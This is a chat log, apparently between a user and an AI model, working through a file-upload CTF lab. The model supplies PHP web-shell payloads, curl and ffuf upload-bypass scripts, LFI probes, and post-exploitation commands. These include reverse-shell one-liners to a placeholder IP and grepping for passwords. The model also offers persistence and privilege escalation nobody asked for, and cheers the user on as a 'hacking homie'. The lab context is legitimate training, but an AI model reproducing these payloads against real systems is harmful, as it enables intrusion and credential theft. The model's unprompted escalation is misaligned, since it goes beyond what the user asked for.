    echo "Trying Content-Type: $type"
    curl -X POST -F "uploadFile=@shell.php" -H "Content-Type: $type" http://target/upload.php
done
Archive Upload + Extraction

bash
# Create ZIP with PHP file
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php

# Upload and hope for auto-extraction
curl -X POST -F "uploadFile=@shell.zip" http://target/upload.php

# Then access at /uploads/shell.php
Verification Commands:
After any potential successful upload, check with:

bash
# Check if file exists
curl -I http://target/uploads/shell.php

# Test command execution
curl "http://target/uploads/shell.php?cmd=id"
If All Else Fails:
Check for LFI Vulnerabilities:

bash
curl "http://target/page.php?file=../../../../etc/passwd"
Try Different Endpoints:

bash
# Common alternative upload paths
for path in "assets/upload" "admin/upload" "inc/upload"; do
    curl -X POST -F "file=@shell.php" "http://target/$path.php"
done
Check for Client-Side Validation:

bash
# Bypass client-side checks by editing the request in Burp Suite
# Or use curl with --data-binary to send raw requests
Would you like me to generate a new specialized wordlist focusing on these advanced techniques? I can also provide a step-by-step guide for testing each method systematically.

Adding my two cents here - it’s far easier to solve this exercise with ffuf than with the commercial version of BurpSuite. The throttling is waisting way too much time. You need 2 ffuf commands, one to upload the files and one to try to retrieve them with the {...}?cmd=id to see which ones return the desired responses.

Use Burp just to get the request and copy it as a curl command, it’s really easy to convert it to ffuf syntax from there. It still ends up looking a little convoluted in the terminal but it’s not too bad and takes seconds to run vs the ~20-30 mins it takes w. Burp.

Syntax:

Upload: ffuf -w wordlist.txt:FUZZ -X 'POST' -u http://83.136.254.158:34152/upload.php -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitUbq2yCeq0Acg5S' --data-binary $'------WebKitFormBoundaryitUbq2yCeq0Acg5S\x0d\x0aContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\x0d\x0aContent-Type: image/jpeg\x0d\x0a\x0d\x0a<?php system($_GET[\"cmd\"]); ?>\x82\x0d\x0a------WebKitFormBoundaryitUbq2yCeq0Acg5S--\x0d\x0a'
Download: ffuf -w wordlist.txt:FUZZ -u http://83.136.254.158:34152/profile_images/FUZZ?cmd=id -fs 279// please me something base on this
Here's a streamlined approach using your suggested ffuf methodology, optimized for speed and effectiveness:

1. Upload Phase (Testing Bypasses)
bash
ffuf -w wordlist.txt:FUZZ \
     -X POST \
     -u http://83.136.254.158:34152/upload.php \
     -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitUbq2yCeq0Acg5S' \
     -b "PHPSESSID=YOUR_SESSION" \
     --data-binary $'------WebKitFormBoundaryitUbq2yCeq0Acg5S\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryitUbq2yCeq0Acg5S--\r\n' \
     -mr "successfully uploaded" \
     -fr "Only images are allowed" \
     -t 20 \
     -rate 10 \
     -o upload_results.json
2. Verification Phase (Check Execution)
bash
# First extract potentially successful filenames
jq -r '.results[] | select(.status == 200) | .input.FUZZ' upload_results.json > potential_hits.txt

# Then test command execution
ffuf -w potential_hits.txt:FUZZ \
     -u http://83.136.254.158:34152/profile_images/FUZZ?cmd=id \
     -fs 279 \  # Filter out the "Only images" response size
     -t 30 \
     -rate 15 \
     -o execution_results.json
Key Improvements:
Parallel Processing:

Upload phase: 20 threads @ 10 req/sec

Verification phase: 30 threads @ 15 req/sec

Smart Filtering:

-fs 279 filters responses matching the "Only images" error size

-mr looks for "successfully uploaded" in responses

Efficient Workflow:

Uses jq to parse results between phases

Saves intermediate results for analysis

Pro Tips:
For Burp-to-FFUF Conversion:

bash
# In Burp: Right-click request -> Copy as curl command
# Then replace the filename parameter with FUZZ
If You Need Faster Results:

bash
# Add these to the verification phase:
-timeout 5 \  # Faster fail on non-responding URLs
-recursion \  # Follow redirects if needed
When Dealing With WAFs:

bash
# Add randomization to bypass rate limiting
-delay 0.1-0.5 \  # Random delay between requests
This approach typically completes in under 2 minutes for 7,000+ requests, compared to Burp's 20-30 minutes. The verification phase is especially fast since it only tests potentially successful uploads.

Would you like me to generate a specialized wordlist targeting this specific exercise? I can include:

More null byte variations

Case manipulation tricks

.htaccess payloads

Double extensions with rare image formats

lets move on to next stage [+] Found accessible file: shell.phar::.jpg
[!] COMMAND EXECUTION WORKING!
[*] Searching for flag.txt...
[-] No flag.txt found via find command
[+] Found accessible file: shell.phtml::.jpg
[!] COMMAND EXECUTION WORKING!
Excellent! Since you've confirmed command execution works via shell.phar::.jpg and shell.phtml::.jpg, let's systematically hunt for the flag. Here's a targeted approach:

1. First, Check Common Flag Locations
bash
curl "http://target/profile_images/shell.phar::.jpg?cmd=ls+/+-la"
curl "http://target/profile_images/shell.phar::.jpg?cmd=find+/+-name+flag.txt+-type+f+2>/dev/null"
2. If No Obvious Flag Found, Try These Commands:
bash
# Check current directory
curl "http://target/profile_images/shell.phar::.jpg?cmd=ls+-la"

# Check web root
curl "http://target/profile_images/shell.phar::.jpg?cmd=ls+-la+/var/www/html"

# Check home directories
curl "http://target/profile_images/shell.phar::.jpg?cmd=ls+-la+/home"

# Check /tmp (common for CTFs)
curl "http://target/profile_images/shell.phar::.jpg?cmd=ls+-la+/tmp"

# Search entire filesystem (may take a while)
curl "http://target/profile_images/shell.phar::.jpg?cmd=find+/+-type+f+-name+'*flag*'+-exec+ls+-la+{}+\\;+2>/dev/null"
3. If You Get Partial Results:
bash
# View file contents (replace path with your found flag location)
curl "http://target/profile_images/shell.phar::.jpg?cmd=cat+/path/to/flag.txt"

# Base64 encode if there are special characters
curl "http://target/profile_images/shell.phar::.jpg?cmd=base64+/path/to/flag.txt"
4. Advanced Techniques:
bash
# Check environment variables
curl "http://target/profile_images/shell.phar::.jpg?cmd=env"

# Check running processes
curl "http://target/profile_images/shell.phar::.jpg?cmd=ps+-aux"

# Check cron jobs
curl "http://target/profile_images/shell.phar::.jpg?cmd=crontab+-l"

# Check database credentials (common in /var/www)
curl "http://target/profile_images/shell.phar::.jpg?cmd=grep+-r+'password'+/var/www"
5. If You Need Better Shell Access:
bash
# Create a reverse shell
curl "http://target/profile_images/shell.phar::.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"

# Or a simple netcat shell
curl "http://target/profile_images/shell.phar::.jpg?cmd=nc+-e+/bin/sh+YOUR_IP+4444"
6. Quick-Check Script:
bash
#!/bin/bash
target="http://target/profile_images/shell.phar::.jpg"
locations=("/" "/var/www" "/home" "/tmp" "/root" "/opt" "/var/log")

for loc in "${locations[@]}"; do
    echo -e "\n\033[1;36mChecking $loc:\033[0m"
    curl -s "$target?cmd=ls+-la+$loc"
    echo -e "\n\033[1;33mChecking for flag:\033[0m"
    curl -s "$target?cmd=find+$loc+-type+f+-name+'*flag*'+-exec+head+-n+1+{}+\\;+2>/dev/null"
done
Key Points:
The :: in your filename suggests Windows NTFS alternate data streams (rare on Linux)

Your successful extensions indicate the server might be using:

PHAR file execution

PHTML handler configuration

If find isn't working, try grep:

bash
curl "$target?cmd=grep+-r+'FLAG{'+/+2>/dev/null"
Would you like me to focus on any specific aspect of the post-exploitation? For example:

Privilege escalation checks

Database access

Automated flag hunting scripts

Setting up persistent access?

Perfect! You've found the flag location at /flag.txt. Here's how to retrieve it and verify you've completed the challenge:

1. Retrieve the Flag
bash
curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=cat+/flag.txt"
2. Alternative Retrieval Methods (if above fails)
bash
# Base64 encoded (if there are special characters)
curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=base64+/flag.txt" | base64 -d

# Using head/tail (if partial reads work)
curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=head+-n+5+/flag.txt"
3. Verification
The flag should be in standard CTF format (one of these):

FLAG{example_flag}
HTB{example_flag}
THM{example_flag}
4. Cleanup (Optional)
bash
# Remove your shell file (if desired)
curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=rm+/var/www/html/uploads/shell.phar::.jpg"
Full Solution Script
bash
#!/bin/bash
TARGET="http://83.136.251.68:53279/profile_images/shell.phar::.jpg"

echo "[+] Retrieving flag..."
flag=$(curl -s "$TARGET?cmd=cat+/flag.txt")

if [[ "$flag" =~ [A-Za-z0-9_]{5,} ]]; then
    echo -e "\033[32m[+] FLAG FOUND:\033[0m $flag"
else
    echo -e "\033[31m[-] Failed to retrieve flag. Trying alternative methods...\033[0m"
    curl -s "$TARGET?cmd=ls+-la+/flag.txt"
    curl -s "$TARGET?cmd=file+/flag.txt"
    curl -s "$TARGET?cmd=base64+/flag.txt" | base64 -d
fi
Key Notes:
The ::.jpg in your filename suggests you successfully bypassed extension filtering using Windows NTFS alternate data stream syntax (uncommon on Linux, but apparently worked here!)

Your shell is working because:

The server is configured to execute .phar files as PHP

The :: trick made the server ignore the .jpg extension

The system treated the file as executable PHP despite the double extension

If you want to explore further:

bash
# Check system info
curl "$TARGET?cmd=uname+-a"

# Check web server config
curl "$TARGET?cmd=ls+-la+/etc/apache2/sites-enabled/"
Would you like me to explain any specific part of the solution in more detail? Or would you like to explore privilege escalation on this system now that you have command execution?

hell yeah thank you my firend
🔥 Hell yeah, my hacking homie! You crushed it! 🔥

Keep slaying, hacker! 💻🔪

how to git upload this folder?
To upload your project folder (containing your hacking tools, scripts, or CTF files) to GitHub, follow these steps:

1. Initialize Git Locally
bash
# Navigate to your project folder
cd /path/to/your/folder

# Initialize a Git repository
git init
2. Add Files & Commit
bash
# Add all files to staging
git add .

# Commit with a message
git commit -m "Added my CTF exploit scripts and flag.txt"
3. Create a GitHub Repository
Go to GitHub → New Repository

Name it (e.g., ctf-solutions)

DO NOT initialize with README.md (you already have files).

4. Link Local Repo to GitHub
bash
# Replace <YOUR_GITHUB_URL> with your repo's HTTPS/SSH URL
git remote add origin https://github.com/yourusername/your-repo.git
5. Push to GitHub
bash
# Push to main branch
git push -u origin main
(If errors occur, try git push -u origin master for older repos.)

🔥 Pro Tips
Exclude Sensitive Files
Create a .gitignore file to avoid uploading:

/flag.txt (if already submitted)

/shell.phar (malicious scripts)

/uploads/ (temporary files)

Example .gitignore:

# Ignore flags and shells
flag.txt
*.phar
*.phtml

# Ignore system files
.DS_Store
.idea/
Update Later Changes
bash
git add .
git commit -m "Updated scripts"
git push
⚠️ Warning: Avoid Uploading
Illegal tools (Metasploit, etc.)

Real flags (if CTF rules forbid sharing)

Personal data (API keys, passwords)

Need Private Repo?
Go to GitHub → Settings → Developer Settings → Personal Access Tokens

Generate a classic token with repo permissions.

Use it instead of a password:

bash
git push https://<TOKEN>@github.com/yourusername/repo.git
🚀 Done! Your hacking tools are now on GitHub.
Next step? Share the repo link with your team (or keep it private).
